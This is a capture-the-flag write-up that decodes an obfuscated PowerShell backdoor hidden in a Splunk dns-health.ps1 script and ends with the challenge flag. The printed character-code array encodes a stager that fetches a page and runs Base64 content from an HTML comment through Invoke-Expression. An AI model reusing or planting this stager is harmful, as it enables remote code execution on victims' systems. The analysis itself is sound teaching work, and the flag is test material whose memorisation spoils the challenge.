# Backdoored Splunk II ✅

## Challenge Description
> ![image](https://github.com/user-attachments/assets/ea8d26f3-a07c-42bf-ac20-777b1e1ab99a)



## Approach
1. This challenge was a bit daunting at first since it was my first time tackling it. However, after doing some Google search, I found that it was very similar to the [Backdoored Splunk](https://github.com/LazyTitan33/CTF-Writeups/blob/main/Huntress-CTF-2023/Forensics/Backdoored_Splunk.md) challenge from a previous CTF event.

2. The first clue was hidden in the dns-health.ps1 file. This PowerShell script contained some unusual content:
   
   ![image](https://github.com/user-attachments/assets/e697f6f0-5f19-4f37-be67-715191cc9e1e)

   Clearly, the list of values looked like ASCII codes. Time to decode this mysterious string! 

3. To decode the ASCII values, I wrote a simple Python script:
   
   ```pyhton
   import base64

   # The list of ASCII values from the PowerShell script
   ascii_values = [
       336 , 79 ,83 , 86, 69 ,82 ,32, 61,32,39 , 105, 101, 120 , 32 , 40 ,91 ,83 , 121 , 115 , 116,101 , 109, 46,84 ,101 ,120 , 116 ,46,69 ,110 ,99, 111 , 100, 105 ,110 ,103 ,93, 58 ,58 ,85, 84,70 , 56,46,71 ,101          ,116,83,116, 114 , 105 , 110, 103 ,40 , 91 , 83 ,121 , 115 ,116, 101, 109 , 46 ,67 ,111, 110,118 , 101, 114 ,116 , 93, 58 ,58, 70,114 ,111, 109 ,66,97 , 115, 101,54, 52 , 83 , 116 , 114 ,105 , 110,103,40 ,34,73,121 , 65 , 107,85, 69 , 57 , 83,86 ,67 ,66 ,105,90 ,87, 120, 118 , 100,121, 66,112 ,99,121 , 66 ,107 ,101, 87 , 53 , 104,98 ,87 , 108 , 106, 73 , 72 , 82 , 118 ,73, 72,82 , 111, 90 , 83, 66, 121 , 100 , 87, 53 , 117 ,97 , 87 , 53 , 110, 73,72 ,78, 108 ,99, 110 , 90 , 112, 89,50 ,85 , 103, 98 ,50 ,89,103 , 100,71,104 ,108,73, 71 ,66 , 84, 100, 71, 70 , 121 , 100 ,71 , 65, 103, 89, 110,86,48, 100,71 , 57, 117 , 68, 81, 112,65 ,75 , 67,82,111 ,100 ,71 ,49 , 115 ,73 , 68,48,103, 75 ,69, 108,117,100, 109 ,57,114 , 90 , 83 , 49,88, 90 ,87,74,83,90, 88, 70, 49, 90,88, 78 ,48, 73,71 ,104 ,48 ,100,72 , 65 , 54 ,76, 121, 57,106 , 97,71, 70,115,98 ,71, 86 ,117 , 90, 50,85 ,117,89 , 51 ,82,109,76 ,109, 100, 104,98 ,87 ,86, 122 ,79 , 105, 82 ,81 ,84 , 49,74, 85 , 73,67,49 ,73 , 90 ,87 ,70,107 , 90, 88 , 74,122 ,73,69, 66 ,55 ,81 ,88 , 86 ,48 ,97 ,71 ,57 , 121 ,97,88, 112,104, 100 ,71 ,108, 118,98,106 , 48 ,111,73 ,107, 74, 104,99,50 ,108,106,73,70, 108 , 116, 82,109,112 ,104, 77 ,108, 74 ,50 ,89,106 ,78 , 74 ,78,109 ,82, 72 , 97,72, 66, 106 ,77 , 84 ,108 ,119, 89 , 122,69, 53,77 , 71 , 70 , 72 ,86, 109,90, 104 , 83 , 70,73,119 ,89 , 48, 89 , 53 ,101 ,108, 112, 89 , 83 , 106,74 , 97, 87 ,69,112 , 109 ,89 ,122, 74,87 ,97, 109,78, 116, 86,106 , 65, 105,75, 88 , 48, 103 , 76,86 ,86 ,122, 90 , 85,74 , 104 ,99, 50,108, 106 ,85, 71, 70 ,121,99,50 , 108 , 117 , 90,121 , 107 ,117, 81,50 ,57,117, 100, 71 , 86 , 117, 100 , 65, 48 , 75,97 , 87,89 ,103, 75 ,67, 82 , 111,100 ,71 , 49, 115 ,73 ,67,49 ,116 , 89 , 88, 82,106 ,97 , 67 , 65,110, 80, 67 , 69 , 116 , 76,83 , 103, 117 , 75 ,106 , 56 ,112 ,76 , 83,48,43,74,121 , 107 ,103 , 101,119 ,48 ,75, 73,67 , 65 ,103,73 , 67 , 82, 50,89 ,87, 120,49 ,90 ,83, 65 , 57 , 73, 67, 82, 116 ,89, 88 , 82,106 ,97 ,71, 86,122, 87, 122,70,100 , 68, 81 ,111,103 , 73 ,67,65 , 103 , 74 , 71, 78 ,118, 98 ,87 ,49, 104 ,98 ,109 ,81, 103,80 , 83 , 66, 98 ,85 , 51 , 108, 122 , 100 ,71,86, 116, 76,108 ,82, 108 , 101,72,81,117 ,82,87 ,53 ,106 ,98 , 50, 82 , 112 ,98,109 ,100,100 , 79 , 106 , 112 ,86 ,86 , 69 , 89,52 ,76,107 , 100,108, 100 , 70, 78,48 ,99,109 , 108,117 , 90 , 121, 104 , 98 , 85, 51, 108 ,122, 100, 71, 86, 116 , 76 , 107, 78 ,118 ,98, 110,90, 108 , 99, 110,82,100, 79,106,112, 71,99,109, 57, 116 , 81 , 109 , 70 , 122 , 90 , 84,89 , 48 , 85, 51 , 82,121 , 97 ,87,53, 110,75,67,82 ,50,89 , 87 , 120 , 49 ,90 , 83 , 107 ,112 ,68, 81,111, 103 , 73, 67, 65 ,103 ,83 ,87, 53 ,50 , 98 , 50, 116 , 108, 76,85,86 , 52 ,99 ,72, 74 ,108, 99,51 ,78, 112 ,98, 50 , 52 , 103, 74, 71, 78,118, 98, 87 , 49 ,104 ,98, 109 ,81 , 78 ,67 ,110,48 , 112 , 34,41, 41 , 41,39
   ]

   # Decode the ASCII values to form the PowerShell command string
   ascii_decoded_string = ''.join(chr(c) for c in ascii_values)
   print("Decoded ASCII String:")
   print(ascii_decoded_string)
   ```

5. The decoded string revealed a PowerShell command with a Base64 encoded segment inside it.

   ![image](https://github.com/user-attachments/assets/a14277f0-a924-4b45-b1cb-c132a90fbeb5)

6. Here’s the Python script to be added to the previous one to extract and decode the Base64 string embedded in the PowerShell command

   ```python
   # Extract the Base64 encoded part from the decoded ASCII string
   base64_encoded_part = ascii_decoded_string.split('Base64String("')[1].split('")')[0]

   # Decode the Base64 string
   decoded_base64 = base64.b64decode(base64_encoded_part).decode('utf-8')
   print("\nDecoded Base64 Content:")
   print(decoded_base64)
   ```

7. The Base64 part decoded into yet another PowerShell command that made a web request using a Basic Authorization header.

   ![image](https://github.com/user-attachments/assets/d4887b97-d7db-4464-8af3-271c44d395e5)

   The PowerShell script performs the following actions:
   - Web Request: Sends a request to the challenge URL using the Authorization header.
   - Response Handling: If the response contains an HTML comment (<!-- ... -->), it captures and decodes the content.
   - Execution: It uses Invoke-Expression to execute the decoded command.

9. I put it to the test by sending the request using `curl`:

   ![image](https://github.com/user-attachments/assets/353ec26f-f6be-41cc-9325-8961b3625343)

   The response contained a Base64 encoded string. I grabbed this string and decoded it using:

   ```
   echo "ZWNobyBmbGFne2UxNWE2YzAxNjhlZTRkZTczODFmNTAyNDM5MDE0MDMyfQ==" | base64 -d
   ```

   And booomm, the flag was revealed!
   
   ![image](https://github.com/user-attachments/assets/64a4aba5-e599-4793-81a4-03cc6d4ada51)
   
## Flag: 
flag{e15a6c0168ee4de7381f502439014032} 



   



